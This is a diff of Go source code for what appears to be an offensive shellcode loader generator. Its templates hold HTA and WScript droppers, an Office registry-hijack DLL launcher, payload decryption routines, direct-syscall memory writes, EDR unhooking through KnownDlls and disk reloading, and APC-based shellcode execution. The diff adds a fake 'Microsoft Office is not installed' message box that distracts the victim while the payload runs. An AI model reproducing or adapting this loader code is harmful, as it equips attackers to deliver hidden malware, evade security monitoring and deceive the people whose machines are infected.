@@ -47,12 +47,12 @@ func WS_JS_Export() string {
 	func DllRegisterServer() {
 		Run()
 	}
-	
+
 	//export DllGetClassObject
 	func DllGetClassObject() {
 		Run()
 	}
-	
+
 	//export DllUnregisterServer
 	func DllUnregisterServer() {
 		Run()
@@ -67,7 +67,7 @@ func WScript_Sandbox() string {
 	}
 	else {
 		{{.Variables.loader}}
-	}	
+	}
 `
 }
 
@@ -101,7 +101,7 @@ func HTA_WScript() string {
 		var {{.Variables.obshell}} = new ActiveXObject("Sh"+"ell.App"+"lication");
 		var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
 		var {{.Variables.dest}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%") + "\\{{.Variables.filename}}";
-	 
+
 		function binaryString(str)
 		{
 			var r = str ? new String(str) : new String();
@@ -128,7 +128,7 @@ func HTA_WScript() string {
 		{
 			var {{.Variables.chunkSize}} = 8192;
 			var {{.Variables.source}} = "{{.Variables.payload}}";
-			var {{.Variables.decodedFile}} = {{.Variables.fos}}.OpenTextFile({{.Variables.dest}}, 2, true); 
+			var {{.Variables.decodedFile}} = {{.Variables.fos}}.OpenTextFile({{.Variables.dest}}, 2, true);
 			var {{.Variables.hexString}} = {{.Variables.source}};
 				var tempArray = new Array();
 				for (var i = 0; i < {{.Variables.hexString}}.length; i += 2)
@@ -142,7 +142,7 @@ func HTA_WScript() string {
 				}
 			{{.Variables.decodedFile}}.Close();
 		}
-	
+
 		function {{.Variables.sleep}}(milliseconds) {
 		  var start = new Date().getTime();
 		  for (var i = 0; i < 1e7; i++) {
@@ -151,7 +151,7 @@ func HTA_WScript() string {
 			}
 		  }
 		}
-		
+
 		{{.Variables.decode}}();
 		{{.Variables.obshell}}.ShellExecute("C:\\Windows\\Sysnative\\wscript.exe",""+{{.Variables.dest}}+"","","",0);
 		}
@@ -176,10 +176,10 @@ func JS_Office_Sub() string {
 	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Options\\OPEN";
 	var {{.Variables.value}} = ""+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}";
 	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}},{{.Variables.value}}, "REG_SZ");
-	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
+	var {{.Variables.objShell}} = new ActiveXObject("shell.application");
     {{.Variables.objShell}}.ShellExecute("{{.Variables.ApplicationName}}", "", "", "open", 0);
 	WScript.Sleep(40000);
-	
+
 	{{.Variables.WshShell}}.RegDelete({{.Variables.strRegPath}});
 	{{.Variables.WshShell}}.RegDelete("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Resiliency\\StartupItems\\");
 
@@ -188,14 +188,14 @@ func JS_Office_Sub() string {
 
 func JS_Control_Sub() string {
 	return `
-	var {{.Variables.objShell}} = new ActiveXObject("sh"+"ell.applic"+"ation");     
+	var {{.Variables.objShell}} = new ActiveXObject("sh"+"ell.applic"+"ation");
     {{.Variables.objShell}}.ShellExecute({{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", "", 1);
 	`
 }
 
 func JS_Msiexec_Sub() string {
 	return `
-	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");     
+	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");
     {{.Variables.objShell}}.ShellExecute("C:\\Windows\\{{.Variables.System32}}\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
 	`
 }
@@ -268,8 +268,8 @@ func Macro() string {
 
 func WS_JS() string {
 	return `
-	var {{.Variables.manifest}} = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="{{.Variables.DLLName}}" version="0.0.0.0"/> 	<file name="{{.Variables.FileName}}{{.Variables.dllext}}">     	<comClass         	description="Description"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="{{.Variables.progid}}"/> 	</file>  </assembly>';    
-   
+	var {{.Variables.manifest}} = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="{{.Variables.DLLName}}" version="0.0.0.0"/> 	<file name="{{.Variables.FileName}}{{.Variables.dllext}}">     	<comClass         	description="Description"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="{{.Variables.progid}}"/> 	</file>  </assembly>';
+
 	var {{.Variables.ax}} = new ActiveXObject("Microsoft.Windows.ActCtx");
 	{{.Variables.ax}}.ManifestText = {{.Variables.manifest}};
 	var {{.Variables.Execute}} = {{.Variables.ax}}.CreateObject("{{.Variables.progid}}");
@@ -284,7 +284,7 @@ func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
 		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
 	}
 
-func {{.Variables.FuncName}}() []byte {	
+func {{.Variables.FuncName}}() []byte {
 	{{.Variables.ciphertext}}
 
 	{{.Variables.vciphertext}}, _ := hex.DecodeString({{.Variables.fullciphertext}})
@@ -307,7 +307,7 @@ func {{.Variables.FuncName}}() []byte {
 }
 func RCFDecrypt_Function() string {
 	return `
-	func {{.Variables.FuncName}}() []byte {	
+	func {{.Variables.FuncName}}() []byte {
 	{{.Variables.ciphertext}}
 	ciphertext, _ := hex.DecodeString({{.Variables.fullciphertext}})
 	key, _ := hex.DecodeString("{{.Variables.key}}")
@@ -321,14 +321,14 @@ func RCFDecrypt_Function() string {
 	cipher.XORKeyStream({{.Variables.raw_bin}}, ciphertext)
 
 	return {{.Variables.raw_bin}}
-	
+
 }
 	`
 }
 
 func ELZMADecrypt_Function() string {
 	return `
-	func {{.Variables.FuncName}}() []byte {	
+	func {{.Variables.FuncName}}() []byte {
 	{{.Variables.ciphertext}}
 	var {{.Variables.buff}} bytes.Buffer
 	{{.Variables.hexdata}}, _ := hex.DecodeString({{.Variables.fullciphertext}})
@@ -411,9 +411,9 @@ func Header() string {
 	)
 
 	{{.Variables.Debug}}
-	
+
 	{{.Variables.Sandboxfunction}}
-	
+
 	func {{.Variables.Versionfunc}}() string {
 		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
 		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
@@ -436,7 +436,7 @@ func Header() string {
 			{{.Variables.customsyscall}} = 0x15
 			{{.Variables.customsyscallVP}}= 0x4d
 		}
-		return {{.Variables.Version}} 
+		return {{.Variables.Version}}
 
 	}
 
@@ -449,7 +449,7 @@ func Header() string {
 			{{.Variables.sum}} += i
 		}
 		return string({{.Variables.decoded}})
-	
+
 	}
 
 	{{.Variables.Console_Function}}
@@ -489,17 +489,17 @@ func Header() string {
 			nSize,
 			uintptr(unsafe.Pointer(&nBytesRead)),
 		)
-	
+
 		return buf, nBytesRead, ret != 0
 	}
-	
+
 	`
 
 }
 
 func DLL_Refresher() string {
 	return `
-	{{.Variables.Header}}	
+	{{.Variables.Header}}
 
 	{{.Variables.ExportName}}
 	{{.Variables.ExportFunction}}
@@ -517,7 +517,7 @@ func DLL_Refresher() string {
 		if {{.Variables.Version}} == "10" {
 			{{.Variables.Reloading}}
 		}
-		{{.Variables.ETW}}	
+		{{.Variables.ETW}}
 		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 
 		{{.Variables.Shellcode_Exec_Function}}({{.Variables.raw_bin}})
@@ -527,15 +527,16 @@ func DLL_Refresher() string {
 
 
 	{{.Variables.ReloadFunction}}
-	
+
 `
 }
 
 func Binary() string {
 	return `
-	{{.Variables.Header}}	
+	{{.Variables.Header}}
 
 	func main() {
+
 		{{.Variables.Sandbox}}
 		{{.Variables.ETW}}
 		{{.Variables.AMSI}}
@@ -548,12 +549,18 @@ func Binary() string {
 		{{.Variables.ETW}}
 		{{.Variables.hide}}
 		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
+
+		go syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
+			uintptr(0),
+			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Microsoft Office is not installed on your PC. Please install Microsoft Office to view this document."))),
+			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Microsoft Office is not installed"))),
+			uintptr(0x00000010))
+
 		{{.Variables.Shellcode_Exec_Function}}({{.Variables.raw_bin}})
 	}
 
 	{{.Variables.Shellcode_Exec}}
 
-	
 	{{.Variables.ReloadFunction}}
 `
 }
@@ -586,7 +593,7 @@ func WriteProcessMemory_Function() string {
 		case {{.Variables.errnoERROR_IO_PENDING}}:
 			return {{.Variables.errERROR_IO_PENDING}}
 		}
-	
+
 		return e
 	}
 	`
@@ -887,7 +894,7 @@ func Syscall_Alloc() string {
 		}
 		{{.Variables.SyscallMessage}}
 		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
-	}	
+	}
 	`
 }
 
@@ -910,11 +917,11 @@ func Syscall_RtlCopy() string {
 		{{.Variables.RtlCopyMemoryMessage}}
 		{{.Variables.RtlCopyMemory}}.Call({{.Variables.ptr}}, (uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}[0])), uintptr(len({{.Variables.raw_bin}})))
 		{{.Variables.VirtualProtectMessage}}
-		
+
 
 
 		[loader].[NtProtectVirtualMemoryprep](
-			{{.Variables.customsyscallVP}}, 
+			{{.Variables.customsyscallVP}},
 			{{.Variables.handle}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
 			&{{.Variables.regionsize}},
@@ -934,7 +941,7 @@ func Syscall_NtQueueAPCThreadEx_Local() string {
 		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
 		QUEUE_USER_APC_FLGAS_MAX_VALUE
 	)
-	
+
 
 	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
 
@@ -958,7 +965,7 @@ func Syscall_NtQueueAPCThreadEx_Local() string {
 		{{.Variables.RtlCopyMemory}}.Call({{.Variables.ptr}}, (uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}[0])), uintptr(len({{.Variables.raw_bin}})))
 		{{.Variables.VirtualProtectMessage}}
 		[loader].[NtProtectVirtualMemoryprep](
-			{{.Variables.customsyscallVP}}, 
+			{{.Variables.customsyscallVP}},
 			{{.Variables.handle}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
 			&{{.Variables.regionsize}},
@@ -981,7 +988,7 @@ func Disk_Refresh() string {
 			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
 			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}),
 			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})}
-			
+
 			for i, _ := range {{.Variables.DLLname}} {
 				{{.Variables.ReloadingMessage}}
 				{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}}[i])
@@ -1008,7 +1015,7 @@ func Disk_Refresh() string {
 
 				{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryJMPprep](
 					{{.Variables.customsyscallVP}},
-					{{.Variables.Address}}, 
+					{{.Variables.Address}},
 					{{.Variables.handlez}},
 					(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 					&{{.Variables.regionsize}},
@@ -1023,8 +1030,8 @@ func Disk_Refresh() string {
 					(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 				}
 				{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryJMPprep](
-					{{.Variables.customsyscallVP}}, 
-					{{.Variables.Address}}, 
+					{{.Variables.customsyscallVP}},
+					{{.Variables.Address}},
 					{{.Variables.handlez}},
 					(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
 					&{{.Variables.regionsize}},
@@ -1034,8 +1041,8 @@ func Disk_Refresh() string {
 			}
 			return nil
 		}
-		
-	
+
+
 	`
 }
 
@@ -1049,7 +1056,7 @@ func KnownDLL_Refresh() string {
 			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
 			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
 			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
-		
+
 	 	for i, _ := range {{.Variables.DLLname}} {
 			KnownDLL({{.Variables.DLLname}}[i])
 			}
@@ -1062,16 +1069,16 @@ func KnownDLL_Refresh() string {
 		type sstring struct {
 			PWstr *uint16
 		}
-	
+
 		func (s sstring) String() string {
 			return windows.UTF16PtrToString(s.PWstr)
 		}
-	
+
 		func KnownDLL({{.Variables.DLL}}  string) []byte {
 			{{.Variables.ReloadingMessage}}
 			var {{.Variables.KnownDll}} , {{.Variables.sztViewSize}} , {{.Variables.CleanSystemDLL}}  uintptr
 			{{.Variables.handle}} := uintptr(0xffffffffffffffff)
-			{{.Variables.ntPathW}} := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + {{.Variables.DLL}} 
+			{{.Variables.ntPathW}} := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + {{.Variables.DLL}}
 			{{.Variables.ntPath}}, _ := windows.NewNTUnicodeString({{.Variables.ntPathW}})
 			{{.Variables.objectAttributes}} := windows.OBJECT_ATTRIBUTES{}
 			{{.Variables.objectAttributes}}.Attributes = 0x00000040
@@ -1081,10 +1088,10 @@ func KnownDLL_Refresh() string {
 			{{.Variables.NtOpenSection}} = 0x37
 			{{.Variables.ttttt}} := 0x0004
 			r, _ := [loader].[NtOpenSectionprep](
-				{{.Variables.NtOpenSection}}, 
-				{{.Variables.Address}}, 
-				uintptr(unsafe.Pointer(&{{.Variables.KnownDll}})), 
-				uintptr({{.Variables.ttttt}}), 
+				{{.Variables.NtOpenSection}},
+				{{.Variables.Address}},
+				uintptr(unsafe.Pointer(&{{.Variables.KnownDll}})),
+				uintptr({{.Variables.ttttt}}),
 				uintptr(unsafe.Pointer(&{{.Variables.objectAttributes}})),
 			)
 			if r != 0 {
@@ -1093,17 +1100,17 @@ func KnownDLL_Refresh() string {
 			zero := 0
 			one := 1
 			[loader].[NtOpenSection](
-				{{.Variables.NtMapViewOfSection}}, 
-				{{.Variables.Address}}, 
-				{{.Variables.KnownDll}}, 
-				{{.Variables.handle}}, 
-				uintptr(unsafe.Pointer(&{{.Variables.CleanSystemDLL}})), 
-				uintptr(zero), 
-				uintptr(zero), 
-				uintptr(zero), 
-				uintptr(unsafe.Pointer(&{{.Variables.sztViewSize}})), 
-				uintptr(one), 
-				uintptr(zero), 
+				{{.Variables.NtMapViewOfSection}},
+				{{.Variables.Address}},
+				{{.Variables.KnownDll}},
+				{{.Variables.handle}},
+				uintptr(unsafe.Pointer(&{{.Variables.CleanSystemDLL}})),
+				uintptr(zero),
+				uintptr(zero),
+				uintptr(zero),
+				uintptr(unsafe.Pointer(&{{.Variables.sztViewSize}})),
+				uintptr(one),
+				uintptr(zero),
 				uintptr(syscall.PAGE_READONLY),
 			)
 			{{.Variables.rawdata}} := rawreader.New({{.Variables.CleanSystemDLL}}, int({{.Variables.sztViewSize}}))
@@ -1128,12 +1135,12 @@ func KnownDLL_Refresh() string {
 			var {{.Variables.oldfartcodeperms}} uintptr
 
 			{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryJMPprep](
-				{{.Variables.mxKeSFQASvbvx}}, 
-				{{.Variables.Address}}, 
-				{{.Variables.handle}}, 
-				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})), 
-				&{{.Variables.regionsize}}, 
-				0x40, 
+				{{.Variables.mxKeSFQASvbvx}},
+				{{.Variables.Address}},
+				{{.Variables.handle}},
+				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
+				&{{.Variables.regionsize}},
+				0x40,
 				&{{.Variables.oldfartcodeperms}},
 			)
 			if {{.Variables.runfunc}} != 0 {
@@ -1141,12 +1148,12 @@ func KnownDLL_Refresh() string {
 			{{.Variables.WriteMemoryfunc}}({{.Variables.bytes}}, uintptr({{.Variables.dllOffset}}))
 			{{.Variables.filee}}.Close()
 			{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryJMPprep](
-				{{.Variables.mxKeSFQASvbvx}}, 
-				{{.Variables.Address}}, 
-				{{.Variables.handle}}, 
-				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})), 
-				&{{.Variables.regionsize}}, 
-				0x20, 
+				{{.Variables.mxKeSFQASvbvx}},
+				{{.Variables.Address}},
+				{{.Variables.handle}},
+				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
+				&{{.Variables.regionsize}},
+				0x20,
 				&{{.Variables.oldfartcodeperms}},
 			)
 			if {{.Variables.runfunc}} != 0 {
